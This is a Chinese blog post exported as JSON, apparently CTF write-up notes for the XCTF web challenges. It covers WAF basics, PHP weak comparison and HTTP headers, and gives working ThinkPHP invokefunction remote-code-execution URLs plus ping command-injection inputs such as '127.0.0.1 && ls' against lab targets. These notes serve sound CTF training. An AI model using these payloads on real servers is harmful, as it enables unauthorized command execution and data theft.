{"title":"web攻防世界","slug":"web攻防世界","date":"2021-01-13T09:11:31.000Z","updated":"2021-02-04T07:41:12.272Z","comments":true,"path":"api/articles/web攻防世界.json","photos":[],"link":"","excerpt":null,"covers":["images/gf1.0.png","images/gf2.0.png","images/gf2.1.png"],"content":"<h2 id=\"WAF\"><a href=\"#WAF\" class=\"headerlink\" title=\"WAF\"></a>WAF</h2><p>WAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。</p>\n<h2 id=\"1-Ping命令用法\"><a href=\"#1-Ping命令用法\" class=\"headerlink\" title=\"1.Ping命令用法\"></a>1.Ping命令用法</h2><p><a href=\"https://blog.csdn.net/qq646748739/article/details/81660514\">https://blog.csdn.net/qq646748739/article/details/81660514</a><br>这题没有上waf，也就是可以篡改网站。<br><img src=\"images/gf1.0.png\" alt=\"1.0\"><br><img src=\"images/gf1.1.png\" alt=\"1.1\"><br>发现可以ping通。ping本地<br><img src=\"images/gf1.2.png\" alt=\"1.2\"><br>搜txt文本，查找flag<br><img src=\"images/gf1.3.png\" alt=\"1.3\"><br>找到flag       </p>\n<hr>\n<h2 id=\"2-php-rce（Ping）\"><a href=\"#2-php-rce（Ping）\" class=\"headerlink\" title=\"2.php_rce（Ping）\"></a>2.php_rce（Ping）</h2><p><img src=\"images/gf2.0.png\" alt=\"2.0\">        </p>\n<blockquote>\n<p>RCE英文全称：remote command/code execute 分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>两个基本命令执行：     </p>\n</blockquote>\n<ul>\n<li>?s=index/think\\app/invokefunction&amp;   function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br><u>执行phpinfo()函数：</u>  </li>\n<li>?s=index/\\think\\app/invokefunction&amp;    function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br><img src=\"images/gf2.1.png\" alt=\"2.1\"><br>得到相应的结果,这里就可以直接运行linux命令了<br>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<u >find / -name “flag”</u><br><img src=\"images/gf2.2.png\" alt=\"2.2\"><br>得到目录,直接查看<br>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag /flag<br><img src=\"images/gf2.3.png\" alt=\"2.3\">  </li>\n</ul>\n<hr>\n<h2 id=\"simple-php\"><a href=\"#simple-php\" class=\"headerlink\" title=\"simple_php\"></a>simple_php</h2><p>php中有两种比较符号<br>=== 会同时比较字符串的值和类型<br>== 会先将字符串换成相同类型，再作比较，属于弱类型比较  </p>\n<hr>\n<h2 id=\"xff-referer\"><a href=\"#xff-referer\" class=\"headerlink\" title=\"xff_referer\"></a>xff_referer</h2><p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项</p>\n<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p>\n<hr>\n<h2 id=\"command-execution\"><a href=\"#command-execution\" class=\"headerlink\" title=\"command_execution\"></a>command_execution</h2><p>2、掌握有关命令执行的知识<br>windows 或 linux 下:<br>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2<br>command1 | command2 只执行 command2<br>command1 &amp; command2 先执行 command2 后执行 command1<br>command1 || command2 先执行 command1，如果为假，再执行   command2<br>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）<br>127.0.0.1 &amp;&amp; ls能看到当前目录下的文件<br>127.0.0.1 &amp;&amp; ls ../到上一级目录  </p>\n<hr>\n<h2 id=\"php-rce\"><a href=\"#php-rce\" class=\"headerlink\" title=\"php_rce\"></a>php_rce</h2><p>php_rce,已经可以看出是 php 远程命令执行的缩写<br>直接看漏洞利用：<br><a href=\"http://localhost:9096/public/index.php?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;va\">http://localhost:9096/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;va</a><br>rs[0]=system&amp;vars[1][]=whoami<br>直接找flag<br>/index.php?s=index/think\\app/invokefunction&amp;func<br>tion=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%<br>22flag%22<br>查flag<br>/index.php?s=index/think\\app/invokefunction&amp;func<br>tion=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</p>\n<hr>\n<h2 id=\"easytornado\"><a href=\"#easytornado\" class=\"headerlink\" title=\"easytornado\"></a>easytornado</h2>","categories":[],"tags":[{"name":"WEB","slug":"WEB","count":1,"path":"api/tags/WEB.json"}]}